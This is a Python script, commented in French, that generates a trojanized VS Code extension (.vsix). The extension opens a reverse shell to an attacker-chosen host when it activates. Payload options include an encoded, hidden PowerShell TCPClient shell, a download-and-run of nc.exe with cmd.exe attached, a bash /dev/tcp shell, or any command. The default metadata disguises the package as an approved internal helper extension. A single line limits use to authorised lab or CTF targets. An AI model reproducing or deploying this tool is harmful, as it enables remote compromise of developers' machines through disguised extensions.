#!/usr/bin/env python3
"""
Generateur de reverse shell package en extension VS Code (.vsix).

Un .vsix est une archive ZIP au format OPC. A l'activation de l'extension,
VS Code appelle activate() qui execute un payload via child_process.

Exemples:
    python3 vsix_revshell.py -i 10.10.14.40 -p 4444
    python3 vsix_revshell.py -i 10.10.14.40 -p 4444 --type nc --nc-url http://10.10.14.40:8000/nc.exe
    python3 vsix_revshell.py -i 10.10.14.40 -p 4444 --type bash -o evil.vsix
    python3 vsix_revshell.py -i 10.10.14.40 -p 4444 --type cmd --cmd "calc.exe"

A n'utiliser que sur des cibles de lab / CTF autorisees.
"""

import argparse
import base64
import io
import json
import zipfile


def ps_revshell(lhost, lport):
    """Reverse shell PowerShell one-liner (TCPClient)."""
    return (
        "$client = New-Object System.Net.Sockets.TCPClient('%s',%d);"
        "$stream = $client.GetStream();"
        "[byte[]]$bytes = 0..65535|%%{0};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        "$sendback = (iex $data 2>&1 | Out-String );"
        "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);"
        "$stream.Flush()};"
        "$client.Close()"
    ) % (lhost, lport)


def ps_encoded(lhost, lport):
    """One-liner PowerShell encode en base64 UTF-16LE (pour -EncodedCommand)."""
    raw = ps_revshell(lhost, lport)
    return base64.b64encode(raw.encode("utf-16-le")).decode()


def build_command(args):
    """Construit la commande shell lancee par child_process selon le type de payload."""
    if args.type == "powershell":
        b64 = ps_encoded(args.lhost, args.lport)
        return "powershell -nop -w hidden -ep bypass -e %s" % b64

    if args.type == "nc":
        if not args.nc_url:
            raise SystemExit("[-] --type nc exige --nc-url http://<ip>:<port>/nc.exe")
        dst = "$env:TEMP\\nc.exe"
        return (
            "powershell -nop -w hidden -c \""
            "Invoke-WebRequest -Uri '%s' -OutFile '%s'; "
            "Start-Process -WindowStyle Hidden '%s' "
            "-ArgumentList '-e cmd.exe %s %d'\""
            % (args.nc_url, dst, dst, args.lhost, args.lport)
        )

    if args.type == "bash":
        return "/bin/bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'" % (args.lhost, args.lport)

    if args.type == "cmd":
        if not args.cmd:
            raise SystemExit("[-] --type cmd exige --cmd '<commande>'")
        return args.cmd

    raise SystemExit("[-] type de payload inconnu: %s" % args.type)


def make_package_json(args):
    pkg = {
        "name": args.name,
        "displayName": args.display_name,
        "description": args.description,
        "publisher": args.publisher,
        "version": args.version,
        "engines": {"vscode": "^%s" % args.engine},
        "categories": ["Other"],
        "activationEvents": ["onStartupFinished", "*"],
        "main": "./extension.js",
        "contributes": {},
    }
    return json.dumps(pkg, indent=2)


def make_extension_js(command):
    # json.dumps echappe quotes/backslashes pour produire une string JS valide.
    cmd_literal = json.dumps(command)
    return (
        "const vscode = require('vscode');\n"
        "const cp = require('child_process');\n"
        "function run(){\n"
        "  try {\n"
        "    cp.exec(%s);\n"
        "  } catch(e){}\n"
        "}\n"
        "function activate(context){ run(); }\n"
        "function deactivate(){}\n"
        "module.exports = { activate, deactivate };\n"
    ) % cmd_literal


def make_content_types():
    return (
        '<?xml version="1.0" encoding="utf-8"?>\n'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">\n'
        '  <Default Extension="json" ContentType="application/json"/>\n'
        '  <Default Extension="js" ContentType="application/javascript"/>\n'
        '  <Default Extension="vsixmanifest" ContentType="text/xml"/>\n'
        '</Types>\n'
    )


def make_vsixmanifest(args):
    return (
        '<?xml version="1.0" encoding="utf-8"?>\n'
        '<PackageManifest Version="2.0.0" '
        'xmlns="http://schemas.microsoft.com/developer/vsx-schema/2011" '
        'xmlns:d="http://schemas.microsoft.com/developer/vsx-schema-design/2011">\n'
        '  <Metadata>\n'
        '    <Identity Language="en-US" Id="%s" Version="%s" Publisher="%s"/>\n'
        '    <DisplayName>%s</DisplayName>\n'
        '    <Description xml:space="preserve">%s</Description>\n'
        '    <Tags>helper</Tags>\n'
        '    <Categories>Other</Categories>\n'
        '    <GalleryFlags>Public</GalleryFlags>\n'
        '    <Properties>\n'
        '      <Property Id="Microsoft.VisualStudio.Code.Engine" Value="^%s" />\n'
        '      <Property Id="Microsoft.VisualStudio.Code.ExtensionDependencies" Value="" />\n'
        '    </Properties>\n'
        '  </Metadata>\n'
        '  <Installation>\n'
        '    <InstallationTarget Id="Microsoft.VisualStudio.Code"/>\n'
        '  </Installation>\n'
        '  <Dependencies/>\n'
        '  <Assets>\n'
        '    <Asset Type="Microsoft.VisualStudio.Code.Manifest" '
        'Path="extension/package.json" Addressable="true"/>\n'
        '  </Assets>\n'
        '</PackageManifest>\n'
    ) % (args.name, args.version, args.publisher, args.display_name,
         args.description, args.engine)


def build_vsix(args):
    command = build_command(args)
    files = {
        "[Content_Types].xml": make_content_types(),
        "extension.vsixmanifest": make_vsixmanifest(args),
        "extension/package.json": make_package_json(args),
        "extension/extension.js": make_extension_js(command),
    }

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for path, content in files.items():
            z.writestr(path, content)

    with open(args.output, "wb") as f:
        f.write(buf.getvalue())

    return command, files


def parse_args():
    p = argparse.ArgumentParser(
        description="Generateur de reverse shell .vsix (extension VS Code).")
    p.add_argument("-i", "--lhost", required=True, help="IP d'ecoute (LHOST)")
    p.add_argument("-p", "--lport", type=int, required=True, help="Port d'ecoute (LPORT)")
    p.add_argument("-o", "--output", default="revshell.vsix", help="Fichier .vsix de sortie")
    p.add_argument("-t", "--type", default="powershell",
                   choices=["powershell", "nc", "bash", "cmd"],
                   help="Type de payload (defaut: powershell)")
    p.add_argument("--nc-url", help="URL de nc.exe pour --type nc")
    p.add_argument("--cmd", help="Commande brute pour --type cmd")

    # Metadonnees de l'extension (les defauts imitent une extension interne anodine).
    p.add_argument("--engine", default="1.118.0",
                   help="Version d'engine VS Code requise (defaut: 1.118.0)")
    p.add_argument("--name", default="approved-helper", help="Id/name de l'extension")
    p.add_argument("--display-name", default="Approved Helper", help="Nom affiche")
    p.add_argument("--description", default="Internal approved VS Code helper extension",
                   help="Description")
    p.add_argument("--publisher", default="checkpoint-it", help="Publisher")
    p.add_argument("--version", default="1.0.0", help="Version de l'extension")
    return p.parse_args()


def main():
    args = parse_args()
    command, files = build_vsix(args)

    print("[+] VSIX genere    : %s" % args.output)
    print("[+] Type de payload: %s" % args.type)
    print("[+] LHOST:LPORT    : %s:%d" % (args.lhost, args.lport))
    print("[+] Engine VS Code : ^%s" % args.engine)
    print("[+] Fichiers packes:")
    for path in files:
        print("      - %s" % path)
    print()
    print("[*] Commande executee a l'activation:")
    print("      %s" % command)
    print()
    print("[*] Prochaine etape: lancer un listener puis deposer le .vsix.")
    print("      rlwrap nc -lvnp %d" % args.lport)


if __name__ == "__main__":
    main()